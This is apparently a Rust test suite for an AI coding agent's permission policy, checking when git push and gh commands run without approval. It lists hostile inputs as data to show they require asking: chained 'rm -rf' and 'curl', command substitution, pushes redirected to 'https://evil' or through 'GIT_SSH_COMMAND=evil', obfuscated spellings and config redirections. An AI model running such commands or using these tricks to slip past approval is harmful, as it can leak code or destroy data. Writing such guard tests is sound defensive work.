//! Owner decision 2026-11-19: a workspace worker publishes its own branch without asking; every
//! other publish, and every command chained with one, asks.
use oxa_perm::{DangerRules, ModePolicy, PathGuard};
use oxa_proto::{Access, Autonomy, Decision, Mode, Policy, YoloSwitch};
use std::path::{Path, PathBuf};
use std::sync::Arc;

static SEQ: std::sync::atomic::AtomicUsize = std::sync::atomic::AtomicUsize::new(0);

/// A repo on `branch` whose remote default branch is `main` (as a clone has it).
fn repo(branch: &str) -> PathBuf {
    let n = SEQ.fetch_add(1, std::sync::atomic::Ordering::Relaxed);
    let dir = std::env::temp_dir().join(format!(
        "oxa-publish-{}-{}-{n}",
        std::process::id(),
        branch.replace('/', "_")
    ));
    let _ = std::fs::remove_dir_all(&dir);
    std::fs::create_dir_all(dir.join(".git")).unwrap();
    std::fs::write(dir.join(".git/HEAD"), format!("ref: refs/heads/{branch}\n")).unwrap();
    std::fs::create_dir_all(dir.join(".git/refs/remotes/origin")).unwrap();
    std::fs::write(
        dir.join(".git/refs/remotes/origin/HEAD"),
        "ref: refs/remotes/origin/main\n",
    )
    .unwrap();
    dir
}

fn decide(cwd: &Path, level: Autonomy, command: &str) -> Decision {
    let guard = PathGuard::new(
        Path::new("/home/u"),
        Path::new("/home/u/.oxa/agent"),
        Path::new("/tmp/oxa-test"),
    );
    let p = ModePolicy::new()
        .with_guard(guard)
        .with_yolo(YoloSwitch::new(level))
        .with_danger(Arc::new(DangerRules::builtin()), Vec::new());
    p.decide(
        Mode::Workspace,
        &Access::Exec {
            command: command.into(),
            net: false,
        },
        cwd,
    )
}

#[test]
fn own_branch_publish_is_allowed() {
    let cwd = repo("my-branch");
    for c in [
        "git push",
        "git push origin HEAD",
        "git push -u origin my-branch",
        "git push origin HEAD:my-branch",
        "GIT_TERMINAL_PROMPT=0 git push",
        "git -C . push origin HEAD",
        "git status && git push",
        "git push && gh pr create --title t --body b",
        "gh pr checks",
        "gh pr view --json state",
        "gh run watch 12 --exit-status",
        "gh api repos/o/r/pulls/1/comments",
        "git push 2>&1 | tail -n 5",
    ] {
        for level in [Autonomy::Standard, Autonomy::Auto] {
            assert_eq!(decide(&cwd, level, c), Decision::Allow, "{c}");
        }
    }
}

#[test]
fn everything_else_asks() {
    let cwd = repo("my-branch");
    for c in [
        "curl x && git push",
        "git push && curl x",
        "git push; rm -rf y",
        "git push | tee f",
        "git push $(curl x)",
        "git push `curl x`",
        "bash -c \"git push && curl x\"",
        "sh -c 'git push'",
        "eval \"git push\"",
        "git push origin +my-branch",
        "git push origin HEAD:main",
        "git push origin HEAD:refs/heads/main",
        "git push --mirror",
        "git push --all",
        "git push --tags",
        "git push --force",
        "git push origin :my-branch",
        "git push upstream my-branch",
        "git -c remote.origin.url=https://evil/r push",
        "git push https://other/repo",
        "gh pr merge 5 --squash",
        "gh pr create -R other/repo",
        "gh release create v1",
        "gh api -X POST repos/o/r/issues",
        "gh api repos/o/r/issues -f title=x",
        "GIT_SSH_COMMAND=evil git push",
    ] {
        for level in [Autonomy::Standard, Autonomy::Auto] {
            assert_eq!(decide(&cwd, level, c), Decision::Ask, "{c}");
        }
        // Yolo is unchanged: it never asks.
        assert_eq!(decide(&cwd, Autonomy::Yolo, c), Decision::Allow, "yolo {c}");
    }
}

#[test]
fn default_branch_push_asks_even_when_checked_out() {
    for b in ["main", "master"] {
        let cwd = repo(b);
        for c in ["git push", "git push origin HEAD", "git push origin main"] {
            assert_eq!(decide(&cwd, Autonomy::Standard, c), Decision::Ask, "{b}: {c}");
        }
    }
}

fn set_config(cwd: &Path, text: &str) {
    std::fs::write(cwd.join(".git/config"), text).unwrap();
}

#[test]
fn configured_push_destinations_ask() {
    for cfg in [
        "[remote \"origin\"]\n\tpush = HEAD:refs/heads/main\n",
        "[remote \"origin\"]\n\tpushurl = https://other/r\n",
        "[push]\n\tdefault = upstream\n",
        "[include]\n\tpath = /tmp/x\n",
        "[core]\n\tsshCommand = evil\n",
    ] {
        let cwd = repo("my-branch");
        set_config(&cwd, cfg);
        for c in ["git push", "git push origin", "git push origin HEAD"] {
            assert_eq!(decide(&cwd, Autonomy::Auto, c), Decision::Ask, "{cfg} {c}");
        }
    }
    // A branch whose upstream is elsewhere: an implicit push asks, an explicit one does not.
    let cwd = repo("my-branch");
    set_config(
        &cwd,
        "[branch \"my-branch\"]\n\tremote = other\n\tmerge = refs/heads/main\n",
    );
    assert_eq!(decide(&cwd, Autonomy::Auto, "git push"), Decision::Ask);
    assert_eq!(
        decide(&cwd, Autonomy::Auto, "git push origin HEAD"),
        Decision::Allow
    );
    let cwd = repo("my-branch");
    set_config(
        &cwd,
        "[branch \"my-branch\"]\n\tremote = origin\n\tmerge = refs/heads/my-branch\n",
    );
    assert_eq!(decide(&cwd, Autonomy::Auto, "git push"), Decision::Allow);
}

#[test]
fn unknown_default_branch_asks() {
    let cwd = repo("develop");
    std::fs::remove_file(cwd.join(".git/refs/remotes/origin/HEAD")).unwrap();
    assert_eq!(
        decide(&cwd, Autonomy::Auto, "git push origin HEAD:develop"),
        Decision::Ask
    );
    std::fs::write(
        cwd.join(".git/refs/remotes/origin/HEAD"),
        "ref: refs/remotes/origin/develop\n",
    )
    .unwrap();
    assert_eq!(
        decide(&cwd, Autonomy::Auto, "git push origin HEAD"),
        Decision::Ask
    );
}

#[test]
fn earlier_branch_switch_asks() {
    let cwd = repo("my-branch");
    for c in [
        "git switch main && git push origin HEAD",
        "git checkout main && git push",
        "git branch -f x && git push",
        "git switch main && gh pr create --title t --body b",
    ] {
        assert_eq!(decide(&cwd, Autonomy::Auto, c), Decision::Ask, "{c}");
    }
}

#[test]
fn gh_spellings_cannot_hide_a_mutation() {
    let cwd = repo("my-branch");
    for c in [
        "gh api repos/o/r/issues --raw-field=title=x",
        "gh api repos/o/r/issues -ftitle=x",
        "gh api repos/o/r/issues -Ftitle=x",
        "gh pr edit --remove-milestone 123 --title changed",
        "gh pr create -Hother-branch --title t --body b",
        "gh pr create --head=other --title t",
        "gh pr update-branch 123 --rebase",
        "gh issue edit 5 --title x",
        "bash -c 'git -C . push origin HEAD:main'",
        "bash -c 'git pu\"\"sh origin HEAD:main'",
        "git --config-env=remote.origin.url=TARGET_URL push origin HEAD",
        "git --exec-path=/tmp/x push origin HEAD",
    ] {
        assert_eq!(decide(&cwd, Autonomy::Auto, c), Decision::Ask, "{c}");
        assert_eq!(decide(&cwd, Autonomy::Yolo, c), Decision::Allow, "yolo {c}");
    }
    assert_eq!(
        decide(&cwd, Autonomy::Auto, "gh pr edit --remove-milestone --title x"),
        Decision::Allow
    );
}

#[test]
fn nested_repository_push_asks() {
    let cwd = repo("my-branch");
    let nested = cwd.join("vendor/other");
    std::fs::create_dir_all(nested.join(".git/refs/remotes/origin")).unwrap();
    std::fs::write(nested.join(".git/HEAD"), "ref: refs/heads/feature\n").unwrap();
    std::fs::write(
        nested.join(".git/refs/remotes/origin/HEAD"),
        "ref: refs/remotes/origin/main\n",
    )
    .unwrap();
    assert_eq!(
        decide(&cwd, Autonomy::Auto, "git -C vendor/other push origin HEAD"),
        Decision::Ask
    );
    assert_eq!(
        decide(&cwd, Autonomy::Auto, "git -C . push origin HEAD"),
        Decision::Allow
    );
}

#[test]
fn hostile_git_metadata_is_not_read() {
    let cwd = repo("my-branch");
    let nested = cwd.join("nested");
    std::fs::create_dir_all(&nested).unwrap();
    let f = std::fs::File::create(nested.join(".git")).unwrap();
    f.set_len(8 << 20).unwrap();
    assert_eq!(decide(&cwd, Autonomy::Auto, "git -C nested push"), Decision::Ask);
    let cwd = repo("my-branch");
    std::fs::remove_file(cwd.join(".git/HEAD")).unwrap();
    std::os::unix::fs::symlink("/etc/hostname", cwd.join(".git/HEAD")).unwrap();
    assert_eq!(decide(&cwd, Autonomy::Auto, "git push"), Decision::Ask);
}

#[test]
fn origin_url_change_after_baseline_asks() {
    for change in [
        "[remote \"origin\"]\n\turl = https://other/r\n",
        "[remote \"origin\"]\n\tpushurl = https://other/r\n",
        "[url \"https://other/\"]\n\tinsteadOf = https://github.com/\n",
    ] {
        let cwd = repo("my-branch");
        set_config(&cwd, "[remote \"origin\"]\n\turl = https://github.com/o/r\n");
        // The first command of the session records the baseline.
        assert_eq!(decide(&cwd, Autonomy::Auto, "git push"), Decision::Allow);
        assert_eq!(
            decide(&cwd, Autonomy::Auto, "git push origin HEAD"),
            Decision::Allow
        );
        // An earlier call changes the config: the push now asks.
        set_config(
            &cwd,
            &format!("[remote \"origin\"]\n\turl = https://github.com/o/r\n{change}"),
        );
        for c in ["git push", "git push origin HEAD"] {
            assert_eq!(decide(&cwd, Autonomy::Auto, c), Decision::Ask, "{change} {c}");
        }
        assert_eq!(decide(&cwd, Autonomy::Yolo, "git push"), Decision::Allow);
    }
}
